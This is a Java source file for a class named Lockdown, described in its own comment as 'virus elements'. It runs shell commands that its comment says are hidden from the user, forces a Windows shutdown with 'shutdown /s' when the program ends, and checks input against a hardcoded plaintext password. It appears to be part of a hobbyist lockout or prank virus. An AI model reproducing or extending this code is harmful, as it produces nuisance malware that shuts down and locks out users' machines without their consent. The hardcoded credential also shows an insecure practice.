package code.utilities;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;

/**
 * Virus elements that do not require forms
 * 
 * @author Teddy
 */
public abstract class Lockdown {

    private static String password = "THISISAPASSWORD";
    
    /**
     * Runs a PowerShell command without alerting the user
     * 
     * @param command the command line
     * @throws IOException the err IOException
     */
    private static void runShellCommand(String command) throws IOException {
        // Executing the command
        Process powerShellProcess = Runtime.getRuntime().exec(command);
        // Getting the results
        powerShellProcess.getOutputStream().close();
        String line;
        Printer.print("[Lockdown] Standard Output:");
        BufferedReader stdout = new BufferedReader(new InputStreamReader(
        powerShellProcess.getInputStream()));
        while ((line = stdout.readLine()) != null) {
            Printer.print("[Lockdown] " + line);
        }
        stdout.close();
        Printer.print("[Lockdown] Standard Error:");
        BufferedReader stderr = new BufferedReader(new InputStreamReader(
        powerShellProcess.getErrorStream()));
        while ((line = stderr.readLine()) != null) {
            System.out.println(line);
        }
        stderr.close();
        Printer.print("[Lockdown] Done");
    }
    
    /**
     * Turns off your computer
     */
    public static void powerOff() {
        Printer.print("[Lockdown] Shutting off comuter!!!");
        try {
            runShellCommand("shutdown /s");
        } catch (IOException ex) {
            Logger.getLogger(Lockdown.class.getName()).log(Level.SEVERE, null, ex);
            Printer.print("[Lockdown] Could not shut down computer");
            Printer.print("[Lockdown] ^ " + ex);
        }
    }
    
    /**
     * Checks to see if the passwords match
     * 
     * @param word the word to check
     * @return if they match
     */
    public static boolean checkPassword(String word) {
        if (word.toUpperCase().equals(password.toUpperCase())) return true;
        else return false;
    }
    
    /**
     * Stops program
     */
    public static void end() {
        Printer.print(" - Terminating - ");
        powerOff();
    }
    
    

}
